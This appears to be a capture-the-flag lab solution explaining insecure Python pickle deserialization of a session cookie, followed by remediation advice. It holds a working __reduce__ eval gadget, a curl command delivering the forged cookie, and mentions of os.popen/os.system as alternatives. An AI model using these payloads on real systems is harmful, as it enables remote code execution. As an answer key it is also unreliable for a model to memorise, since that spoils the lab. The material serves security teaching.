# w14 Pickle Vault :: solution

## Root cause

`app/server.py`, `Handler._session()`:

```python
cookie = self._cookie(COOKIE)
if not cookie:
    return Session(), False
try:
    data = base64.b64decode(cookie)
except Exception:
    return Session(), False
# --- the bug -----------------------------------------------------
session = pickle.loads(data)
# -----------------------------------------------------------------
return session, True
```

`pickle.loads()` is not a parser. It is a small virtual machine, and its opcode
set includes `REDUCE` — "pop a callable and an argument tuple, call it". A class
whose `__reduce__` returns `(os.popen, (cmd,))` is compiled into exactly that,
so the command runs **during** deserialization, before the handler has even seen
the result.

There is no integrity check of any kind: the cookie is base64 over raw pickle,
and the client fully controls it. Base64 is an encoding, not a signature. The
service treats the cookie as the session, which is the design flaw underneath
the technical one — client-held state must never be trusted to be well-formed
Python objects.

The remaining half of the challenge is making the result *observable*. That is
free here, because `Handler._describe()` reflects the object back:

```python
def _describe(session):
    fields = {
        "user": getattr(session, "user", "guest"),
        "theme": getattr(session, "theme", "cyberpunk"),
        "messages": [str(m) for m in getattr(session, "messages", [])],
    }
```

Duck-typed on purpose: whatever object the deserializer produced is rendered
into `/api/session`. Using `os.popen` as the gadget means the reconstructed
object *is* a file object, and `str(m)` over it yields the command output. That
is why this is not a blind RCE.

## Recon

The landing page states the construction and mints a real cookie at boot, so you
can see the shape of a valid session before tampering with it:

```bash
curl -s http://localhost:30014/api/health
# {"service":"pickle-vault","lab":"w14","serializer":"pickle","session_cookie":"vault_session",...}
```

Confirm the vault is genuinely shut — no route hands it over:

```bash
curl -s http://localhost:30014/api/vault
# {"vault":"locked","note":"the vault is not a session field and no route returns it"}
```

Decode the default cookie to see what a normal session looks like. It is
standard `pickle.dumps()` output over a `Session` instance, and its fields match
exactly what `/api/session` echoes:

```bash
python -c '
import pickle,base64
print(base64.b64decode("gASV...").hex())' | xxd | head
```

Note what the flag *is* here. `app/vault.py` is root-owned and `chmod 0400`, and
the service drops to uid 10001 before it serves a single request — so `cat`ing
the file out of a shell fails even from inside the container:

```bash
docker exec -u 10001 w0b-w14 cat /app/vault.py
# cat: can't open '/app/vault.py': Permission denied
```

The server imports it *once at boot while still root*, so the value is already
in the running process's memory. Reading it from disk and getting the process to
hand it over are different problems, and only the second one is the intended
path.

## Exploit

The gadget:

```python
class RCE:
    def __reduce__(self):
        return (eval, ("__import__('vault').VAULT_FLAG",))
```

`__reduce__` returning `(callable, args)` makes the pickler emit `GLOBAL eval`,
the args tuple, then `REDUCE`. On the way back in, `REDUCE` pops both and calls
`eval("__import__('vault').VAULT_FLAG")` — **inside the server process**, so
`__import__` hits `sys.modules` and returns the module the boot-time import
already loaded. No file is opened and no file access is needed.

Send it as the cookie:

```bash
COOKIE=$(python -c '
import base64, pickle
class RCE:
    def __reduce__(self):
        return (eval, ("__import__(\"vault\").VAULT_FLAG",))
print(base64.b64encode(pickle.dumps(RCE())).decode())')

curl -s http://localhost:30014/api/session -H "cookie: vault_session=$COOKIE"
```

```json
{
  "cookie_present": true,
  "session": {
    "user": "guest",
    "theme": "cyberpunk",
    "messages": ["hex4b0t{...}"]
  }
}
```

The flag is in the response body. The bundled script does the same thing and
prints it:

```bash
python solution/exploit.py
# [*] target        http://localhost:30014
# [*] service       pickle-vault v1.14.0 (lab w14)
# [*] serializer    pickle
# [*] benign object -> {'user': 'guest', 'theme': 'cyberpunk', 'messages': ['vault: locked']}
# [*] payload       gASVQ... 
# [+] FLAG: hex4b0t{verifytest123456}
```

## Gadget choice

`eval` is used rather than `os.system` or `os.popen` because it returns the flag
*string* directly, in the server process, with no child process and no file
access. `os.system` returns only an exit code and prints to the server's stdout,
where the caller cannot see it. `os.popen` does return the output, but only as a
file object — the handler has to know to call `.read()` on it (this lab's
`_describe()` does, so `os.popen` works here too and is a fine alternative
payload). `eval` is a single `GLOBAL` opcode and lands the value straight in the
response.

`server._self_check()` runs a `REDUCE` gadget at image build time, so a broken
pickle environment fails the build instead of shipping an unsolvable lab.

## The fix

**Never deserialize untrusted bytes with `pickle`.** There is no safe mode and no
amount of input validation makes it safe — the format is a VM by design.

1. **Serve state, not objects.** A session cookie should be a signed token with
   a fixed, primitive shape (JSON, or a JWT/JWS), and the signature checked
   before parsing. If it does not verify, reject the request; do not parse it
   and hope.
2. **If you must keep pickle on the wire**, restrict the unpickler's
   `find_class` to an explicit allowlist so `os`/`subprocess` can never be
   resolved:

   ```python
   class SafeUnpickler(pickle.Unpickler):
       ALLOWED = {"app.server.Session"}
       def find_class(self, module, name):
           if f"{module}.{name}" not in self.ALLOWED:
               raise pickle.UnpicklingError(f"blocked {module}.{name}")
           return super().find_class(module, name)
   ```

   This is a mitigation, not a fix — it is one `find_class` typo away from being
   reopened, and it does not stop resource-exhaustion payloads. Prefer (1).
3. **Do not let the flag sit in a module the request path imports.** Defence in
   depth: a separate process, a socket, or a secret manager means a compromised
   worker cannot simply read its own memory for the secret.

## Flag

Injected at runtime into `W0B_FLAG` and read by `app/vault.py` at import. There
is no static value to hardcode and no route that returns it.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
